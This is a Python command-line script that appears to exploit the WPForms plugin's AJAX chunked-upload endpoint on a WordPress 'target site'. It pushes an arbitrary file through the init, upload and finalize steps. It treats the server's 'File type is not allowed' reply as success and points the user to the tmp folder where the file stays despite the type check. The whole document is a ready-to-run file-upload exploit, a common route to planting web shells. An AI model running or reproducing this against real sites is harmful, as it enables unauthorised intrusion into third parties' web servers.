import uuid
import os
import argparse
import requests

def upload_wpforms_file(site, ajax_path, file_path, form_id, field_id):
    url = f"{site}{ajax_path}"
    dzuuid = str(uuid.uuid4())
    file_name = os.path.basename(file_path)
    file_size = os.path.getsize(file_path)
    chunk_size = 524288  # 512 KB

    print(f"📤 Uploading {file_name} to {site} (form_id={form_id}, field_id={field_id})")

    # Step 1: Init chunk
    print("\n🟠 Step 1: Initiating chunk...")
    resp1 = requests.post(
        url,
        data={
            "action": "wpforms_upload_chunk_init",
            "form_id": form_id,
            "field_id": field_id,
            "name": file_name,
            "slow": "true",
            "dzuuid": dzuuid,
            "dzchunkindex": 0,
            "dztotalfilesize": file_size,
            "dzchunksize": chunk_size,
            "dzchunkbyteoffset": 0,
        },
        headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
    )

    #print(f"🔹 Status Code: {resp1.status_code}")
    #print(f"🔹 Response: {resp1.text}")
    if not resp1.ok:
        print("❌ Error during init request.")
        return

    # Step 2: Upload chunk
    print("\n🟠 Step 2: Uploading file chunk...")
    with open(file_path, "rb") as f:
        files = {
            f"wpforms_{form_id}_{field_id}": (file_name, f, "application/octet-stream"),
        }
        data = {
            "action": "wpforms_upload_chunk",
            "form_id": form_id,
            "field_id": field_id,
            "dzuuid": dzuuid,
            "dzchunkindex": 0,
            "dztotalfilesize": file_size,
            "dzchunksize": chunk_size,
            "dztotalchunkcount": 1,
            "dzchunkbyteoffset": 0,
        }

        resp2 = requests.post(url, data=data, files=files)

    #print(f"🔹 Status Code: {resp2.status_code}")
    #print(f"🔹 Response: {resp2.text}")
    if not resp2.ok:
        print("❌ Error during file chunk upload.")
        return

    # Step 3: Finalize upload
    print("\n🟠 Step 3: Finalizing upload...")
    resp3 = requests.post(
        url,
        data={
            "action": "wpforms_file_chunks_uploaded",
            "form_id": form_id,
            "field_id": field_id,
            "name": file_name,
            "dzuuid": dzuuid,
            "dzchunkindex": 0,
            "dztotalfilesize": file_size,
            "dzchunksize": chunk_size,
            "dztotalchunkcount": 1,
            "dzchunkbyteoffset": 0,
        },
        headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
    )

    #print(f"🔹 Status Code: {resp3.status_code}")
    #print(f"🔹 Response: {resp3.text}")
    if ( resp3.status_code == 403 or resp3.status_code == 200) and ('File type is not allowed' in resp3.text):   
        print(f"\n✅ Upload completed (finalized).\n\n🔹 {file_name} is uploaded on the following path\n\n🔹 /wp-content/uploads/wpforms/tmp/\n")        
    else:
        print("\n🚫 File rejected: Type not allowed.\n")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Upload a file using WPForms AJAX chunk API")
    parser.add_argument("--site", required=True, help="Target site (e.g. https://abc.com)")
    parser.add_argument("--ajax-path", required=True, help="AJAX path (e.g. /wp-admin/admin-ajax.php)")
    parser.add_argument("--file", required=True, help="Path to the file to upload")
    parser.add_argument("--form-id", required=True, help="WPForms form ID (e.g. 11)")
    parser.add_argument("--field-id", required=True, help="WPForms field ID (e.g. 40)")

    args = parser.parse_args()

    upload_wpforms_file(
        site=args.site,
        ajax_path=args.ajax_path,
        file_path=args.file,
        form_id=args.form_id,
        field_id=args.field_id,
    )
